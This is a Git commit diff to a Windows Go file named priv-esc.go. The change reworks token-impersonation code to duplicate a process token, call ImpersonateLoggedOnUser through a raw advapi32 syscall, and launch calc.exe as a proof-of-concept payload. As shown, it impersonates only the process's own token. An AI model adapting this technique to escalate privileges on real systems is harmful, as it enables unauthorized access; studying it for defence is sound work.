ccf4861c1e4fdb90dded8b84bb34ac3e1e710d7f
BlackMagic <149164084+blackmagic2023@users.noreply.github.com>
2024-11-14 09:01:34 -0500

    Update priv-esc.go

--- priv-esc.go
+++ priv-esc.go
@@ -3,13 +3,19 @@ package main
 import (
     "fmt"
     "golang.org/x/sys/windows"
-    "os"
+    "os/exec"
+    "syscall"
 )
 
-func ImpersonateUser() {
+var (
+    advapi32                    = syscall.NewLazyDLL("advapi32.dll")
+    procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
+)
+
+func ImpersonateAndRunCalc() {
     var hToken windows.Token
     proc := windows.CurrentProcess()
-    
+
     err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hToken)
     if err != nil {
         fmt.Printf("OpenProcessToken failed. Error: %v\n", err)
@@ -17,31 +23,29 @@ func ImpersonateUser() {
     }
     defer hToken.Close()
 
-    var hImpersonatedToken windows.Token
-    err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &hImpersonatedToken)
+    var impersonatedToken windows.Token
+    err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &impersonatedToken)
     if err != nil {
         fmt.Printf("DuplicateToken failed. Error: %v\n", err)
         return
     }
-    defer hImpersonatedToken.Close()
+    defer impersonatedToken.Close()
 
-    err = windows.ImpersonateLoggedOnUser(hImpersonatedToken)
-    if err != nil {
+    // Call ImpersonateLoggedOnUser via syscall
+    r1, _, err := procImpersonateLoggedOnUser.Call(uintptr(impersonatedToken))
+    if r1 == 0 {
         fmt.Printf("ImpersonateLoggedOnUser failed. Error: %v\n", err)
         return
     }
     defer windows.RevertToSelf()
 
-    var username [256]uint16
-    var size uint32 = 256
-    err = windows.GetUserNameEx(windows.NameSamCompatible, &username[0], &size)
+    cmd := exec.Command("calc.exe")
+    err = cmd.Run()
     if err != nil {
-        fmt.Printf("GetUserNameEx failed. Error: %v\n", err)
-    } else {
-        fmt.Printf("Impersonated user: %s\n", windows.UTF16ToString(username[:]))
+        fmt.Printf("Failed to start calc.exe: %v\n", err)
     }
 }
 
 func main() {
-    ImpersonateUser()
+    ImpersonateAndRunCalc()
 }
